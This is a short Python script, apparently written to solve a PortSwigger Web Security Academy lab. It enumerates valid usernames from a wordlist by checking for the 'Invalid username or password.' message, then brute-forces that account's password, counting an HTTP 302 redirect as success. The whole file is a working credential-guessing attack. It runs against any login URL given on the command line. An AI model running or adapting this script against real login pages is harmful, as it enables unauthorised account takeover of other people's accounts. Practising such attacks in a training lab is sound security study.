#Only for compleating Portswigger Academy Challange
#Author: zemler
#Date: 21.02.2024

import requests
import sys

login_url = sys.argv[1]
invalid_response = "Invalid username or password."


with open('users.txt', 'r') as userfile:
    user = userfile.readline().strip()
    while user:
        
        parameters = {'username': user, 'password':'aaa'}
        rq = requests.post(login_url, data=parameters)
        if invalid_response not in rq.text:
            print(f"[+] Valid username: {user}")
            print("[+] Attemping to Bruteforce Passowrd")
            break
        else:
            print(f"[-] Invalid username {user}")
        user = userfile.readline().strip()    
    correct_user = user
    
with open('passwords.txt', 'r') as passwords:
    password = passwords.readline().strip()
    while password:
        parameters = {'username': correct_user, 'password': password}
        rq = requests.post(login_url, data=parameters, allow_redirects=False)
        if rq.status_code == 302:
            print(f"[!][+] Valid username: {correct_user}, Valid password {password}")
            break
        else:
            print(f"[-]Invalid password: {password}")
        password = passwords.readline().strip()

        
        
        
        